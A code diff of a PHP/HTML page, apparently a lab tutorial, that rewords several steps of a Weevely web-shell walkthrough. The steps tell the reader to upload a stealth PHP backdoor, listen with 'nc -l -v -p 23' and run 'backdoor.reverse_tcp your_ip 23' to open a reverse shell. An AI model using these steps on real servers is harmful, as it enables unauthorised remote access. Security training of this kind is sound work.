@@ -83,7 +83,7 @@ require_once 'u.php';
         <label>Step 2a.</label> Upload this PHP stealth web shell and backdoor to a web server (that support php)
     </fieldset>
      <fieldset>
-         <label>Step 2b.</label>Let say u’ve successfully uploaded the PHP backdoor with the address <b>http://192.168.2.29/upload/yourshell.php</b>
+         <label>Step 2b.</label>Suppose u’ve successfully uploaded the PHP backdoor with the address <b>http://192.168.2.29/upload/yourshell.php</b>
          where upload is the directory on the server where you uploaded your shell.<?php $host=$_SERVER['SERVER_ADDR'];echo "<p>Open Terminal  <a target='_blank' href='https://$host:4200/'>here</a></p>";?>
 
      </fieldset>
@@ -98,11 +98,11 @@ require_once 'u.php';
         <b>Format :</b> shell.sh  system_command</p>
     </fieldset>
         <fieldset>
-            <label>Step 2e.</label>Use NetCat to listen for an incoming connection in our attacker computer
+            <label>Step 2e.</label>Use NetCat to listen for an incoming connection in your attacker computer
             <?php $host=$_SERVER['SERVER_ADDR'];echo "<p>Open <a target='_blank' href='https://$host:4200/'>Terminal </a>and type:<code>  nc -l -v -p 23</code></p>";?>
     </fieldset>
     <fieldset>
-        <label>Step 2f.</label>Back to Weevely terminal opened in <b>step 2D</b>, after NetCat successfully listening on specific port, now we make a reverse TCP connection to our computer. 
+        <label>Step 2f.</label>Back to Weevely terminal opened in <b>step 2D</b>, after NetCat successfully listening on specific port, now  make a reverse TCP connection to our computer. 
         <code>backdoor.reverse_tcp your_ip 23</code>
     </fieldset>
     <fieldset>
